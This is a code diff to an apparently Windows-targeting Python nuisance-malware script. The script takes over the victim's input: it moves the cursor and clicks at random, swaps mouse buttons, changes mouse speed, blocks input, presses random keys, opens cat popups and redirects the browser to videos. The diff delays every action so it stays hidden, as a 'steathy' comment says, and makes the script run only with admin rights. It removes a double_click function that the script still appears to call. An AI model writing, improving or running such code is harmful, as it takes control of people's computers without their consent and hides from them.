@@ -180,9 +180,6 @@ def wheel(delta=1):
 def move_to(x, y):
     user32.SetCursorPos(int(x), int(y))
 
-def move_relative(x, y):
-    user32.mouse_event(MOUSEEVENTF_MOVE, int(x), int(y), 0, 0)
-
 class POINT(Structure):
     _fields_ = [("x", c_long), ("y", c_long)]
 
@@ -196,15 +193,6 @@ def click(button=LEFT):
     """ Sends a click with the given button. """
     press(button)
     release(button)
-
-def double_click(button=LEFT):
-    """ Sends a double click with the given button. """
-    click(button)
-    click(button)
-
-def right_click():
-    """ Sends a right click with the given button. """
-    click(RIGHT)
 
 def move(x, y, absolute=True, duration=0.0, steps_per_second=120.0):
     x = int(x)
@@ -300,8 +288,9 @@ def mouse_malfunction() -> Callable:
         user32.SystemParametersInfoW(0x0071, 0, new_sense, 0)  # SPI_SETMOUSESPEED
 
     while True:
-        random.choice([move_mouse_randomly, random_clicks, random_wheel_scroll, double_click, swap_mouse_buttons, cursor_trail, sensitivity])()
         time.sleep(random.randint(30, 300))  # try stay steathy hopefully lol
+        random.choice([move_mouse_randomly, random_clicks, random_wheel_scroll, double_click, swap_mouse_buttons, cursor_trail, sensitivity])()
+        
 
 
 def keyboard_malfunction() -> Callable:
@@ -329,8 +318,9 @@ def keyboard_malfunction() -> Callable:
     
     
     while True:
+        time.sleep(random.randint(30, 300))
         random.choice([block_input, random_key_presses, broken_caps_lock])()
-        time.sleep(random.randint(30, 300))  # Up to 30s delay to try stay steathy hopefully lol
+        
 
 
 # Feature 2 - Random popup windows, no idea how to do this yet...
@@ -344,6 +334,7 @@ def funny_windows():
     url = 'https://cataas.com/cat?position=center&width=1000&height=1000&json=true'
     req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
     while True:
+        time.sleep(random.randint(60, 600))
         response = json.loads(urlopen(req).read())
 
         window = tk.Toplevel()
@@ -362,7 +353,6 @@ def funny_windows():
         window.title("Meow :3")
         window.update()
 
-        time.sleep(random.randint(60, 600))
         if window.winfo_exists():
             window.destroy()
 
@@ -379,8 +369,8 @@ def redirects():
         'https://www.youtube.com/watch?v=XqZsoesa55w' # Baby Shark
     ]
     while True:
-        webbrowser.open(random.choice(sites))
         time.sleep(random.randint(60, 600))
+        webbrowser.open(random.choice(sites))
 
 
 # Example usage for now
@@ -393,4 +383,5 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+    if is_admin():
+        main()
